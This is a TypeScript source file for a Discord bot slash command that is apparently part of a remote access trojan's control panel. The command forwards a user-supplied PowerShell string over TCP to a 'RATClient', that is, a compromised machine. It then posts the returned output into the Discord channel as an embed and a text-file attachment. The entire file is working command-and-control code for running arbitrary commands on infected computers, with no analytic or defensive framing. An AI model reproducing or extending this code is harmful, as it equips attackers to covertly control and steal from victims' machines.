import { ApplicationCommandOptionType, ChatInputCommandInteraction, Colors, EmbedBuilder, PermissionsBitField, SlashCommandBooleanOption} from "discord.js";
import Command from "../base/classes/Command";
import CustomClient from "../base/classes/CustomClient";
import Category from "../base/enums/Category";
import Code from "../base/enums/Codes";
import TcpPacket from "../base/classes/TcpPacket";
const fs = require('fs');


export default class Powershell extends Command {
    constructor(client: CustomClient) {
        super(client, {
            name: "powershell",
            description: "Powershell.",
            category: Category.Utilities,
            dm_permissions: false,
            default_member_permissions: PermissionsBitField.Flags.UseApplicationCommands,
            cooldown: 3,
            options: [
                {
                    name: "command",
                    description: "Command to execute",
                    type: ApplicationCommandOptionType.String,
                    required: true
                }
            ]
        });
    }

    async Execute(interaction: ChatInputCommandInteraction) {
        await interaction.deferReply();
        let RATClient = await this.client.getRATClient(interaction);
        if (!RATClient) return;

        let command = interaction.options.getString("command", true);
        let buffer = Buffer.from(command, "utf-8");
        let packet = new TcpPacket(Code.POWERSHELL, buffer);

        RATClient.send(packet);
        let response = await RATClient.receive();
        if (!response || !response.payload) {
            return interaction.editReply({
                embeds: [new EmbedBuilder().setTitle("Erreur").setDescription("Erreur inconnue.").setColor(Colors.Red)]
            })
        }

        await interaction.editReply({
            embeds: [getEmbed(response)]
        })

        // Convert response.payload to a text file
        const text = response.payload.toString('utf-8');
        fs.writeFileSync('response.txt', text);

        // Send the text file
        let channel = interaction.channel;
        if (!channel) return;

        await channel.send({
            files: [{
                attachment: './response.txt',
                name: 'response.txt'
            }]
        });
 
        // Delete the text file
        fs.unlinkSync('response.txt');
    }
}

function getEmbed(packet: TcpPacket): EmbedBuilder {
    let buffer = packet.payload;
    let status = (packet.code === Code.SUCCESS) ? "Success" : "Error";

    if (!buffer) return new EmbedBuilder().setTitle("Erreur").setDescription("Erreur inconnue.");
    let data = buffer.toString("utf-8");
    return new EmbedBuilder()
        .setTitle((status === "Success") ? "Success" : "Error")
        .setColor((status === "Success") ? Colors.Green : Colors.Red);
}